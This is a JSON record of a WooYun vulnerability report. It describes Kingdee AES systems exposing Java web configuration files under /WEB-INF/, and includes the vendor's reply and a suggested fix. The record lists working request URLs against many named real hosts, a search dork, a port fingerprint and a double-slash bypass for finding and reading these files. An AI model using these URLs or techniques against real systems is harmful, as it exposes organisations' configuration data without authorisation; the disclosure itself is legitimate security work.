{"id": 46834, "wybug_id": "wooyun-2014-083323", "wybug_title": "金蝶AES系统Java web配置文件可下载", "wybug_corp": "金蝶", "wybug_author": "lijiejie", "wybug_date": "2014-11-14 22:18", "wybug_open_date": "2015-02-12 22:20", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向公众公开  简要描述： 金蝶AES系统Java web配置文件可任意下载。 详细说明：  金蝶AES系统 Java web配置文件可随意下载：魅族的系统示范：\nhttp://58.63.253.42/portal/WEB-INF/web.xmlhttp://58.63.253.42/portal/WEB-INF/config/pluto/pluto-portal-driver-services-config.xmlhttp://58.63.253.42/portal/WEB-INF/config/spring/applicationContext-basic.xmlhttp://58.63.253.42/portal/WEB-INF/config/spring/applicationContext-datasource.xmlhttp://58.63.253.42/portal//WEB-INF/config/spring/applicationContext-frame.xmlhttp://58.63.253.42/portal//WEB-INF/config/spring/applicationContext-pub.xmlhttp://58.63.253.42/portal//WEB-INF/config/spring/applicationContext-perm.xmlhttp://58.63.253.42/portal//WEB-INF/config/spring/applicationContext-setting.xmlhttp://58.63.253.42/portal//WEB-INF/config/spring/applicationContext-page.xmlhttp://58.63.253.42/portal/WEB-INF/config/spring/applicationContext-personal.xmlhttp://58.63.253.42/portal//WEB-INF/config/spring/applicationContext-portlet.xmlhttp://58.63.253.42/portal/WEB-INF/config/spring/applicationContext-weibo.xmlhttp://58.63.253.42/portal//WEB-INF/config/spring/applicationContext-report.xmlhttp://58.63.253.42/portal//WEB-INF/config/spring/applicationContext-sms.xmlhttp://58.63.253.42/portal/WEB-INF/sso/applicationContext-ssoClient.xml\neassso下的配置文件：\nhttp://58.63.253.42/eassso//WEB-INF/web.xmlhttp://58.63.253.42/eassso//WEB-INF/applicationContext.xmlhttp://58.63.253.42/easssoWEB-INF/deployerConfigContext.xml\n   漏洞证明：  读取数据源配置 http://58.63.253.42/portal/WEB-INF/config/spring/applicationContext-datasource.xml， 得到：\n<beans default-lazy-init=\"true\" default-autowire=\"no\" default-dependency-check=\"none\">  <bean id=\"dataSource\" class=\"com.kingdee.portal.biz.core.datacenter.KDPortalDataSource\">    <property name=\"dataSource\">      <ref bean=\"MZROS\" />    </property>  </bean>  <bean id=\"MZROS\" class=\"org.springframework.jndi.JndiObjectFactoryBean\">    <property name=\"jndiName\" value=\"jdbc/MZROS\" />  </bean></beans>\n检索关键字：  inurl:/eassso/   可以找到了同类系统，以下地址手工验证存在漏洞（该系统较多监听6888端口，可以根据这个特征定位），若一个斜杠下载不成功，可尝试加双斜杠：http://www.zkjteas.com/portal/WEB-INF/web.xmlhttp://hr.winshare.com.cn/portal/WEB-INF/web.xmlhttp://eas.hanslaser.com/portal/WEB-INF/web.xmlhttp://oa.gedu.org/portal/WEB-INF/web.xmlhttp://oa2.srfky.com:7888/eassso//WEB-INF/web.xmlhttp://caiwu.21edu.com:8080/eassso//WEB-INF/web.xmlhttp://116.6.21.39/eassso//WEB-INF/web.xmlhttp://58.251.74.73/eassso//WEB-INF/web.xmlhttp://203.81.30.169/eassso//WEB-INF/web.xmlhttp://183.62.56.219:8080/eassso//WEB-INF/web.xmlhttp://oa.sincere.com.cn/eassso//WEB-INF/web.xmlhttp://58.17.181.205/eassso//WEB-INF/web.xmlhttp://58.248.137.198:8080/eassso//WEB-INF/web.xmlhttp://oa.gedu.org/eassso//WEB-INF/web.xmlhttp://211.162.66.185:6888/eassso//WEB-INF/web.xmlhttp://eas.hanslaser.com/eassso//WEB-INF/web.xmlhttp://119.6.105.83/eassso//WEB-INF/web.xmlhttp://118.114.239.103/eassso//WEB-INF/web.xml   修复方案：  禁止通过web访问   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-18 08:32 厂商回复： 感谢关注金蝶信息安全，已经在处理中。谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-13 10:00 |    \t\tLoveSnow \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 以正和，以奇胜！)\t\t \n  李姐出品，必为精品！求带我飞，哈哈！@lijiejie    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}